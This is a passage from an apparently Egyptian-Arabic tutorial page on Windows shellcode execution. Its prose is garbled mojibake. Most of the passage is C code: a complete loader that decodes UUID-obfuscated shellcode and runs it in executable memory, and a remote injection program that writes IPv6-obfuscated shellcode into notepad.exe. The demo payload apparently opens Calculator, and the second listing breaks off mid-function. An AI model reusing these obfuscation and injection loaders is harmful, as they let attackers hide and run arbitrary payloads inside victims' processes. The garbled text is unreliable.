                    <li style="font-weight: bold;">Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø§Ù„ÙƒÙˆØ¯ Ø§Ø´ØªØºÙ„ ÙˆØªÙ…Ø§Ù… :</li>
                    ÙˆÙ„Ùˆ Ø­Ø§Ø¨Ø¨ ØªØ¶ÙŠÙ Ø£ÙŠ Ø¹Ø¨Ø§Ø±Ø§Øª ØªÙ†Ø·Ø¨Ø¹ Ø²ÙŠ Ø§Ù„Ù„Ù€ ÙƒÙ†Ø§ Ø¨Ù†Ø¹Ù…Ù„Ø© ÙÙ€ ÙƒÙ„ Ø§Ù„Ù…Ù‚Ø§Ù„Ø§Øª Ø§Ù„Ù„Ù€ ÙØ§ØªØª ØŒ ÙÙ€ Ø¨Ø±Ø§Ø­ØªÙƒ.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalShellcodeEx-3.png" alt="LocalShellcodeEx-3" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p style="font-weight: bold;">Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ :</p>
                <div class="code-block"><code>
                    #include &lt;windows.h><br>
                        #include &lt;stdio.h><br><br>
                        
                        char* UuidArray[] = {<br>
                            &nbsp;&nbsp;"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",<br>
                            &nbsp;&nbsp;"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",<br>
                            &nbsp;&nbsp;"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",<br>
                            &nbsp;&nbsp;"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",<br>
                            &nbsp;&nbsp;"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",<br>
                            &nbsp;&nbsp;"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"<br>
                        };<br><br>
                        
                        #define NumberOfElements 18<br><br>
                        
                        typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(<br>
                        &nbsp;&nbsp;RPC_CSTR        StringUuid,<br>
                        &nbsp;&nbsp;UUID* Uuid<br>
                            );
                            <br><br>
                        BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br>
                            &nbsp;&nbsp;PBYTE pBuffer = NULL, TmpBuffer = NULL;<br>
                            &nbsp;&nbsp;SIZE_T sBuffSize = 0;<br>
                            &nbsp;&nbsp;NTSTATUS STATUS = 0;<br><br>
                        
                            &nbsp;&nbsp;fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");<br>
                            &nbsp;&nbsp;if (pUuidFromStringA == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
                                &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
                                &nbsp;&nbsp;if (pBuffer == NULL) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
                        
                                    &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pBuffer);<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer += 16;<br>
                                            &nbsp;&nbsp;}<br><br>
                        
                                            &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
                                            &nbsp;&nbsp;*pDSize = sBuffSize;<br>
                                            &nbsp;&nbsp;return TRUE;<br>
                        }<br><br>
                        
                        int main() {<br>
                            &nbsp;&nbsp;PBYTE pDeobfuscatedPayload = NULL;<br>
                            &nbsp;&nbsp;SIZE_T sDeobfuscatedSize = 0;<br>
                            &nbsp;&nbsp;DWORD dwOldProtection = 0;<br><br>
                        
                        
                            &nbsp;&nbsp;if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                &nbsp;&nbsp;}<br><br>
                                &nbsp;&nbsp;PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                                &nbsp;&nbsp;if (pShellcodeAddress == NULL) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);<br>
                                    &nbsp;&nbsp;memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);<br>
                                    &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br><br>
                        
                                    &nbsp;&nbsp;if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                        &nbsp;&nbsp;}<br><br>
                        
                                        &nbsp;&nbsp;DWORD threadID;<br>
                                        &nbsp;&nbsp;HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, &threadID);<br>
                                        &nbsp;&nbsp;if (hThread == NULL) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                            &nbsp;&nbsp;}<br><br>
                        
                                            &nbsp;&nbsp;WaitForSingleObject(hThread, INFINITE);<br>
                                            &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                                            &nbsp;&nbsp;CloseHandle(hThread);<br><br>
                        
                                            &nbsp;&nbsp;return 0;<br>
                        }<br>
                        
                </code></div>
                <br>
                <h2 style="direction: ltr;">2. Remote Shellcode Injection</h2>
                <p>[+] Ù„Ùˆ ÙØ§ÙƒØ± ÙÙ€ Ù…Ù‚Ø§Ù„Ø© Ø§Ù„Ù€ DLL Injection ØŒ Ø§ØªÙƒÙ„Ù…Ù†Ø§ Ø¹Ù† Ø¥Ø²Ø§ÙŠ Ù†Ø­Ù‚Ù† Ù…Ù„Ù DLL Ø¯Ø§Ø®Ù„ Ø¨Ø±ÙˆØ³ÙŠØ³ ÙÙ€ Ø¬Ø²Ø¦ÙŠØ© Ø§Ù„Ù€ <code
                        style="background: gold; font-size: 14px;">Remote DLL Injection</code>.</p>
                <p style="font-weight: bold;">[+] Ù‡Ù†Ø§ Ø¨Ù‚Ù‰ ÙÙ€ Ø§Ù„Ù€ <code
                        style="background: gold; font-size: 14px;">Remote Shellcode Injection</code> ØŒ Ù‡Ù†Ø³ØªØ¹ÙŠÙ† Ø¨Ù†ÙØ³
                    Ø§Ù„ÙÙƒØ±Ø© ØŒ Ø¨Ø³
                    Ø¨Ø¯Ù„ Ù…Ù€ Ø¨Ù†Ø­Ù‚Ù† DLL ØŒ Ù‡Ù†Ø­Ù‚Ù†
                    Shellcode Ø¬ÙˆØ§ Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ Ø§Ù„Ù„Ù€ Ù…Ø³ØªÙ‡Ø¯ÙÙŠÙ†Ù‡Ø§ .. ÙˆØªØ¹Ø§Ù„ÙŠ Ø£Ù‚ÙˆÙ„Ùƒ Ù‡Ù†Ù…Ø´ÙŠ Ø¥Ø²Ø§ÙŠ :</p>
                <ol>
                    <li>Ø¨Ù†Ø§Ø®Ø¯ <code style="background: gold; font-size: 14px;">Snapshot</code> Ù„ÙƒÙ„ Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„Ù„Ù€
                        Ø´ØºØ§Ù„Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code style="background: gold; font-size: 14px;">CreateToolhelp32Snapshot</code>.
                    </li>
                    <li>Ø¨Ø¹Ø¯ÙŠÙ† Ù†Ø¨Ø¯Ø£ Ù†Ø¯ÙˆØ± Ø¹ Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯ÙØ© ØŒ ÙˆÙ„Ù…Ø§ Ù†Ù„Ø§Ù‚ÙŠÙ‡Ø§ Ø¨Ù†Ø§Ø®Ø¯ <code
                            style="background: gold; font-size: 14px;">Handle</code> Ø¹Ù„ÙŠÙ‡Ø§ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">OpenProcess</code>.
                    </li>
                    <li>Ø¨Ù†Ø­Ø¬Ø² Ù…Ø³Ø§Ø­Ø© ÙÙ€ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¬ÙˆÙ‡ Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">VirtualAllocEx</code> ØŒ ÙˆØ¨Ø¹Ø¯Ù‡Ø§ Ø¨Ù†ÙƒØªØ¨ Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯
                        ÙÙŠÙ‡Ø§ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù…
                        <code style="background: gold; font-size: 14px;">WriteProcessMemory</code>.
                    </li>
                    <li> Ø¨Ø¹Ø¯ ÙƒØ¯Ù‡ Ø¨Ù†ØºÙŠØ± ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¹Ø´Ø§Ù† ØªÙƒÙˆÙ† Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„ØªÙ†ÙÙŠØ° Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">VirtualProtectEx</code>.</li>
                    <li> ÙˆØ¢Ø®Ø± Ø­Ø§Ø¬Ù‡ Ø¨Ù†Ø´ØºÙ„ Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">CreateRemoteThread</code>.</li>
                </ol>
                <p style="font-weight: bold;">[+] ÙŠÙ„Ø§ Ø¨ÙŠÙ†Ø§ Ù†Ø´ÙˆÙ Ø§Ù„Ø®Ø·ÙˆØ§Øª :</p>
                <ol>
                    <li style="font-weight: bold;">Ø£ÙˆÙ„ Ø¬Ø²Ø¡ Ù‡Ù†Ø³ØªØ®Ø¯Ù… ØªÙˆÙ„ Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">HellShell</code> Ø²ÙŠ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ù„Ù€ ÙÙˆÙ‚ .. ÙˆØ¹Ø´Ø§Ù†
                        Ø­Ø§Ø¨Ø¨
                        Ø£ØºÙŠØ± Ù‚ÙˆÙ„Øª Ù‡Ø³ØªØ®Ø¯Ù… Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ù€
                        <code style="background: gold; font-size: 14px;">IPv6</code> Ø§Ù„Ù…Ø±Ø§Ø¯ÙŠ :
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-1.png" alt="RemoteShellcodeInj-1" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡Ù†Ø³ØªØ¹ÙŠÙ† Ø¨Ø§Ù„ÙÙ†ÙƒØ´Ù† <code
                            style="background: gold; font-size: 14px;">GetRemoteProcessHandle</code> Ù…Ù† ÙƒÙˆØ¯ Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">Remote DLL Injection</code> .. ÙˆÙ‡Ù†Ø¶ÙŠÙ Ù…ÙƒØªØ¨Ø© Ø§Ù„Ù€
                        &lt;<code style="background: gold; font-size: 14px;">TlHelp32.h</code>> :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-2.png" alt="RemoteShellcodeInj-2" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡Ù†ÙƒØ±ÙŠØª ÙØ§Ù†ÙƒØ´Ù† Ø¨Ù€ Ø§Ø³Ù… <code
                            style="background: gold; font-size: 14px;">ShellcodeInjectionToRemoteProcess</code> ÙˆØ¯ÙŠ Ø§Ù„Ù„Ù€
                        Ù…Ø³Ø¦ÙˆÙ„Ø© Ø¹Ù† Ø¥Ù†Ù‡Ø§ ØªØ­Ù‚Ù† Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ :
                    </li>
                    ÙˆØ¬Ø²Ø¡ Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ù„Ù€ Ù‡Ù†Ø§ Ù…Ø¨ÙŠØ®ØªÙ„ÙØ´ ÙƒØªÙŠØ± Ø¹Ù† Ø§Ù„Ù€ <code
                        style="background: gold; font-size: 14px;">Remote DLL Injection</code> .. ÙÙ€ ØªÙ‚Ø¯Ø± ØªØ±Ø¬Ø¹ Ù„Ù„Ù…Ù‚Ø§Ù„Ø©
                    Ø§Ù„Ù„Ù€ ÙØ§ØªØª
                    ÙˆÙ‡ØªÙÙ‡Ù… .. ÙˆÙƒØ°Ù„Ùƒ Ø§Ù„Ù…Ù‚Ø§Ù„Ø§Øª ÙƒÙ„Ù‡Ø§ Ù…Ø§Ø´ÙŠÙŠÙ† Ø¹ Ù†ÙØ³ Ø§Ù„Ù†Ù…Ø· ÙÙ€ Ø§Ù„Ø¯Ù†ÙŠØ§ Ø§Ù„Ù…ÙØ±ÙˆØ¶ ØªÙƒÙˆÙ† Ø¨Ø³ÙŠØ·Ø© ÙŠØ¹Ù†ÙŠ.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-3.png" alt="RemoteShellcodeInj-3" class="article-image"
                            loading="lazy">
                    </div>
                    <li>Ø¢Ø®Ø± Ø¬Ø²Ø¡ ÙˆØ¯Ø§ Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">main func</code> ÙˆØ¹Ø§Ø¯ÙŠ ÙƒØ°Ù„Ùƒ Ø²ÙŠ
                        ÙƒÙˆØ¯ Ø§Ù„Ù€ DLL ÙˆØ§Ù„Ø§ÙƒÙˆØ§Ø¯ Ø§Ù„Ø³Ø§Ø¨Ù‚Ø© :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-4.png" alt="RemoteShellcodeInj-4" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ÙŠÙ„Ø§ Ù†Ù€ Ø±Ù† :</p>
                <ul>
                    <li>Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø¥Ù† Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">Calculator</code> Ø¨ØªØ´ØªØºÙ„ Ù…Ù†
                        Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ ÙˆØªÙ…Ø§Ù… :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-5.png" alt="RemoteShellcodeInj-5" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p style="font-weight: bold;">[+] ØªØ¹Ø§Ù„ÙŠ Ù†ØªØ£ÙƒØ¯ Ø£ÙƒØªØ± ÙˆÙ†Ø¬Ø±Ø¨ Ø·Ø±ÙŠÙ‚Ø© ØªØ§Ù†ÙŠØ© Ù…Ø³ØªØ®Ø¯Ù…Ù†Ù‡Ø§Ø´ Ù‚Ø¨Ù„
                    ÙƒØ¯Ù‡ :</p>
                <ol>
                    <li style="font-weight: bold;">Ù‡Ù†Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù€ <a href="https://sourceforge.net/projects/x64dbg/"
                            target="_blank" class="download-link">x64dbg</a> ÙˆØ¯ÙŠ ØªÙˆÙ„ Ø¨ØªØ³ØªØ®Ø¯Ù… Ù„Ù„Ù€ Debugging .. Ù‡Ù†Ø´ØºÙ„
                        Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬
                        Ø¨ØªØ§Ø¹Ù†Ø§ Ø¹ Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">notepad.exe</code></li>
                    <li style="font-weight: bold;">Ù…Ù† Attach Ù‡Ù†Ø±Ø¨Ø· Ø§Ù„Ø¨Ø±ÙˆØ³ÙŠØ³ <code
                            style="background: gold; font-size: 14px;">notepad.exe</code></li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-6.png" alt="RemoteShellcodeInj-6" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ø¨Ø¹Ø¯ ÙƒØ¯Ù‡ Ù‡Ù†Ø¶ØºØ· Enter Ø¹Ø´Ø§Ù† ÙŠØ¹Ù…Ù„ Deobfuscation ØŒ ÙˆÙƒÙ…Ø§Ù† ÙŠØ­Ø¬Ø² Ù…ÙƒØ§Ù† ÙÙ€
                        Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ ÙˆÙŠØ·Ù„Ø¹ Ø§Ù„Ù€ Address :</li>
                    Ù‡Ù†Ø¶ØºØ· <code style="background: gold; font-size: 14px;">Ctrl + G</code> ÙˆÙ†Ø¶ÙŠÙ Ø§Ù„Ù€ Address Ù‡Ù†Ø§ :
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-7.png" alt="RemoteShellcodeInj-7" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡Ù‚Ù Ø¹ Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù„Ù€ Ø±ÙˆØ­ØªÙ„Ù‡ ØŒ <code
                            style="background: gold; font-size: 14px;">Right-Click > Follow in Dump > Selected
                        Address</code> :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-8.png" alt="RemoteShellcodeInj-8" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø¥Ù† Ø¯Ù‡ Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù„Ù€ Ø­Ø¬Ø²Ù†Ø§Ù‡ ÙÙ€ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ .. ÙˆØ­Ø§Ù„ÙŠØ§ ÙØ§Ø¶ÙŠ :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-9.png" alt="RemoteShellcodeInj-9" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡ØªØ¶ØºØ· Enter .. Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø¥Ù† Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ø§ØªÙ†Ù‚Ù„ Ù„Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù„Ù€ Ø­Ø¬Ø²Ù†Ø§Ù‡ Ø¨Ø§Ù„ÙØ¹Ù„ :
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-10.png" alt="RemoteShellcodeInj-10"
                            class="article-image" loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ø¢Ø®Ø± Ø­Ø§Ø¬Ù‡ .. Ù‡ØªØ±Ù† ÙˆÙ‡ØªÙ„Ø§Ù‚ÙŠ Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">Calculator</code> ÙØªØ­Øª Ù…Ù† Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">notepad.exe</code> Ø¨Ù†Ø¬Ø§Ø­
                        :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteShellcodeInj-11.png" alt="RemoteShellcodeInj-11"
                            class="article-image" loading="lazy">
                    </div>
                </ol>


                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ :</p>
                <div class="code-block"><code>
                    #include &lt;Windows.h><br>
                        #include &lt;stdio.h><br>
                        #include &lt;TlHelp32.h><br><br>
                        
                        char* Ipv6Array[] = {<br>
                            &nbsp;&nbsp;"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",<br>
                            &nbsp;&nbsp;"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",<br>
                            &nbsp;&nbsp;"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",<br>
                            &nbsp;&nbsp;"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",<br>
                            &nbsp;&nbsp;"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",<br>
                            &nbsp;&nbsp;"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:9090:9090:9090:9090:9090:9090"<br>
                        };<br><br>
                        
                        #define NumberOfElements 18<br><br>
                        
                        typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(<br>
                        &nbsp;&nbsp;PCSTR                   S,<br>
                        &nbsp;&nbsp;PCSTR* Terminator,<br>
                        &nbsp;&nbsp;PVOID                   Addr<br>
                            );<br><br>
                        
                        
                        BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br><br>
                        
                            &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
                            &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
                        
                            &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
                        
                            &nbsp;&nbsp;PCSTR           Terminator = NULL;<br><br>
                            
                            &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
                        
                            &nbsp;&nbsp;// getting RtlIpv6StringToAddressA  address from ntdll.dll<br>
                            &nbsp;&nbsp;fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");<br>
                            &nbsp;&nbsp;if (pRtlIpv6StringToAddressA == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                                &nbsp;&nbsp;// getting the real size of the shellcode (number of elements * 16 => original shellcode size)<br>
                                &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
                                &nbsp;&nbsp;// allocating mem, that will hold the deobfuscated shellcode<br>
                                &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
                                &nbsp;&nbsp;if (pBuffer == NULL) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br>
                                    &nbsp;&nbsp;// setting TmpBuffer to be equal to pBuffer<br>
                                    &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
                        
                        
                                    &nbsp;&nbsp;// loop through all the addresses saved in Ipv6Array<br>
                            &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;// Ipv6Array[i] is a single ipv6 address from the array Ipv6Array<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if failed ...<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;&nbsp;&nbsp;// tmp buffer will be used to point to where to write next (in the newly allocated memory)<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 16);<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
                                    &nbsp;&nbsp;*pDSize = sBuffSize;<br>
                                    &nbsp;&nbsp;return TRUE;<br>
                        }<br><br>
                        
                        BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)<br>
                        {<br>
                            &nbsp;&nbsp;HANDLE hSnapshot = NULL;<br>
                            &nbsp;&nbsp;PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };<br><br>
                        
                            &nbsp;&nbsp;hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);<br>
                            &nbsp;&nbsp;if (hSnapshot == INVALID_HANDLE_VALUE) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateToolhelp32Snapshot Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;if (!Process32First(hSnapshot, &Proc)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Process32First Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;do {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;WCHAR LowerName[MAX_PATH * 2];<br><br>
                        
                                        &nbsp;&nbsp;&nbsp;&nbsp;if (Proc.szExeFile) {<br><br>
                        
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwSize = lstrlenW(Proc.szExeFile);<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD i = 0;<br><br>
                        
